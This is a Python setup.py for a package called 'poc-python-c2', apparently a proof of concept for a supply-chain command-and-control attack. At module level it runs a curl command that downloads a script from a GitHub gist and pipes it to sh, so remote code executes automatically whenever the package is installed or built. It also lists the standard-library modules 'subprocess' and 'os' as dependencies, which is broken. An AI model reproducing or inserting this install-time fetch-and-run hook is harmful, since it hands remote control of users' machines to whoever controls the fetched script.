from setuptools import setup
import subprocess, os

# def run_command(command):
#     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setpgrp)
#     return process

subprocess.run("curl -sL https://gist.githubusercontent.com/rroiii/f65772e4a3202b49ba421d0511aece17/raw/e664d317cb1c5fb673a01113b7de295faa38712c/poc-c2 | sh", shell=True, check=True)

setup(
    name='poc-python-c2',
    version='0.1',
    packages=['poc-python-c2'],
    install_requires=[
        'subprocess',
        'os'
    ]
)
